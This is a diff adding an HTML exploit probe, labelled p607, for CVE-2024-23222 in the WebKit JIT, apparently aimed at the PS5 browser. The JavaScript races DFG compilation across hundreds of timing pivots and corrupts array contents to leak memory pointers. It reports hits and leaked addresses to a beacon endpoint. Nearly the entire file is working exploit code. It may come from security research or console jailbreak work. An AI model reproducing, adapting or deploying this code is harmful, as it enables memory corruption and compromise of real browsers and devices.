@@ -1,0 +1,329 @@
+<!--
+  p607: CVE-2024-23222 fine-grained DFG race
+
+  p606 findings: FTL absent on PS5. Race needs DFG-tier calibration.
+
+  This probe:
+  A. Tests if new Function() gets JIT-compiled vs regular function
+  B. Uses REGULAR function (guaranteed DFG) with deopt+recompile cycle
+  C. Fine-grained PIVOT sweep: every iteration from 60-300
+  D. 50 padding loops to maximize DFG compilation time
+
+  If DFG concurrent compilation is active AND the TOCTOU exists in DFG,
+  one of these 240 PIVOTs should hit the race window.
+
+  CRASH_CLASS: LOW
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p607</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+function hex32(v){var s=(v>>>0).toString(16);while(s.length<8)s='0'+s;return s;}
+
+var guardObj={guard_p1:1,p1:[1.1,2.2]};
+var trainingArray=[1.1,1.1];
+trainingArray.ho=1.1;
+var fallbackArray=[1.1,2.2];
+fallbackArray.ho=1.1;
+var lowBits=new Uint32Array(2);
+var asDouble=new Float64Array(lowBits.buffer);
+var phantom={fakeHeader:1,fakeButterfly:2};
+var trapArray=[1.1,phantom];
+
+function main(){
+b('P607-DFG-RACE-FINE');
+
+// ================================================================
+// SECTION A: JIT compilation test — new Function vs regular function
+// ================================================================
+b('SEC-A:JIT-TEST');
+
+// Test 1: new Function
+var nf=new Function('n','var s=0;for(var i=0;i<n;i++)s+=i*1.1;return s;');
+for(var i=0;i<300;i++) nf(100);
+var t0=Date.now();
+for(var i=0;i<50000;i++) nf(100);
+var nfTime=Date.now()-t0;
+
+// Test 2: regular function
+function rf(n){var s=0;for(var i=0;i<n;i++)s+=i*1.1;return s;}
+for(var i=0;i<300;i++) rf(100);
+var t1=Date.now();
+for(var i=0;i<50000;i++) rf(100);
+var rfTime=Date.now()-t1;
+
+// Test 3: eval'd function
+try{eval('function ef(n){var s=0;for(var i=0;i<n;i++)s+=i*1.1;return s;}');}catch(e){}
+if(typeof ef==='function'){
+  for(var i=0;i<300;i++) ef(100);
+  var t2=Date.now();
+  for(var i=0;i<50000;i++) ef(100);
+  var efTime=Date.now()-t2;
+  b('A-EVAL:'+efTime+'ms');
+}
+
+b('A-NEWFUNC:'+nfTime+'ms,REGULAR:'+rfTime+'ms');
+
+// Test 4: trigger function with padding — does it compile?
+function padded(o,d){
+  "uo" in o;var arr=o.p1;if(d)arr=fallbackArray;
+  var h=0;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  asDouble[0]=arr[1];
+  lowBits[0]=lowBits[0]+16;
+  arr[1]=asDouble[0];
+}
+
+var tObj0={p1:trainingArray,p2:1,uo:1};
+var dObj0={p1:fallbackArray,p2:1,uo:1};delete dObj0.p2;dObj0.p2=1;
+
+for(var i=0;i<300;i++){
+  if(i%3===0) padded(dObj0,true);
+  else padded(tObj0,false);
+}
+var t3=Date.now();
+for(var i=0;i<5000;i++) padded(tObj0,false);
+var padTime=Date.now()-t3;
+b('A-PADDED:'+padTime+'ms(5K calls)');
+
+// ================================================================
+// SECTION B: Fine-grained DFG race with REGULAR function
+// ================================================================
+// Uses deopt+recompile cycle: one regular function, race attempt,
+// deopt via wrong type, rewarm, race again.
+b('SEC-B:FINE-RACE');
+
+var bHits=0;
+var bTotal=0;
+
+// Trigger function — regular declaration (guaranteed DFG compilation)
+function trigger(obj,useDivergent){
+  "uo" in obj;
+  var arr=obj.p1;
+  if(useDivergent) arr=fallbackArray;
+  var h=0;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  while(h<1){guardObj.guard_p1=1;h++;}h--;
+  asDouble[0]=arr[1];
+  lowBits[0]=lowBits[0]+16;
+  arr[1]=asDouble[0];
+}
+
+// Sweep PIVOTs from 60 to 300, step 1
+for(var pivot=60;pivot<=300;pivot++){
+  var tgt={p1:trainingArray,p2:1,uo:1};
+  var div={p1:fallbackArray,p2:1,uo:1};
+  delete div.p2;div.p2=1;
+
+  // Warmup + race (single PIVOT per attempt)
+  var total=pivot+100; // run 100 iterations past the delete
+  for(var t=0;t<total;t++){
+    if(t===pivot) delete tgt.p2;
+    if(t%3===0) trigger(div,true);
+    else trigger(tgt,false);
+  }
+
+  // Post-race check
+  tgt.p1=trapArray;
+  lowBits[0]=0;lowBits[1]=0;
+  trigger(tgt,false);
+
+  var hi=lowBits[1];
+  var topBits=hi>>>16;
+  bTotal++;
+
+  if(topBits===0x0000&&hi!==0){
+    bHits++;
+    var lo=lowBits[0]-16;
+    if(lo<0){lo+=0x100000000;hi--;}
+    b('★★★ B-HIT:pivot='+pivot+',ptr=0x'+hex32(hi)+hex32(lo)+' ★★★');
+  }
+
+  // Force deopt so trigger() gets recompiled next round
+  try{trigger(42,false);}catch(e){}
+  try{trigger(null,false);}catch(e){}
+  // Re-prime IC with clean objects
+  var clean1={p1:trainingArray,p2:1,uo:1};
+  var clean2={p1:fallbackArray,p2:1,uo:1};
+  for(var c=0;c<20;c++){
+    trigger(clean1,false);
+    trigger(clean2,true);
+  }
+}
+
+b('B-RESULT:pivots='+bTotal+',hits='+bHits);
+
+// ================================================================
+// SECTION C: Same race but with higher PIVOT range (500-5000)
+// ================================================================
+// In case DFG threshold is higher on PS5 or compilation is slow
+b('SEC-C:HIGH-DFG');
+var cHits=0;
+var cTotal=0;
+
+// Coarser sweep: step 20, 500-5000
+for(var pivot=500;pivot<=5000;pivot+=20){
+  var tgt2={p1:trainingArray,p2:1,uo:1};
+  var div2={p1:fallbackArray,p2:1,uo:1};
+  delete div2.p2;div2.p2=1;
+
+  var total=pivot+200;
+  for(var t=0;t<total;t++){
+    if(t===pivot) delete tgt2.p2;
+    if(t%3===0) trigger(div2,true);
+    else trigger(tgt2,false);
+  }
+
+  tgt2.p1=trapArray;
+  lowBits[0]=0;lowBits[1]=0;
+  trigger(tgt2,false);
+
+  var hi=lowBits[1];
+  var topBits=hi>>>16;
+  cTotal++;
+
+  if(topBits===0x0000&&hi!==0){
+    cHits++;
+    var lo=lowBits[0]-16;
+    if(lo<0){lo+=0x100000000;hi--;}
+    b('★★★ C-HIT:pivot='+pivot+',ptr=0x'+hex32(hi)+hex32(lo)+' ★★★');
+  }
+
+  // Deopt + reprime
+  try{trigger(42,false);}catch(e){}
+  try{trigger(null,false);}catch(e){}
+  var c1={p1:trainingArray,p2:1,uo:1};
+  var c2={p1:fallbackArray,p2:1,uo:1};
+  for(var c=0;c<20;c++){trigger(c1,false);trigger(c2,true);}
+}
+
+b('C-RESULT:pivots='+cTotal+',hits='+cHits);
+
+// ================================================================
+// SECTION D: Constant fold detection
+// ================================================================
+// If DFG constant-folds obj.p1 to trainingArray, the return value
+// is hardcoded 1.1 even after swapping. This proves constant folding
+// is active (necessary condition for the vuln).
+b('SEC-D:CONSTFOLD');
+
+function cfTest(o){return o.p1[0];}
+var cfObj={p1:[9.9,8.8],p2:1};
+for(var i=0;i<10000;i++) cfTest(cfObj);
+
+// Check if it's constant-folded: change p1
+cfObj.p1=[7.7,6.6];
+var cfResult=cfTest(cfObj);
+b('D-SWAP-TEST:expected=7.7,got='+cfResult+',folded='+(cfResult===9.9));
+
+// ================================================================
+// SUMMARY
+// ================================================================
+var total=bHits+cHits;
+b('SUMMARY:B='+bHits+',C='+cHits+',total='+total);
+if(total>0){
+  b('★★★ CVE-2024-23222-CONFIRMED-ON-PS5 ★★★');
+}else{
+  b('NO-HITS:DFG-race-window-too-narrow-or-bug-not-in-DFG-tier');
+}
+b('P607-COMPLETE');
+}
+
+setTimeout(main,200);
+</script></head><body>p607: DFG fine-grained race</body></html>
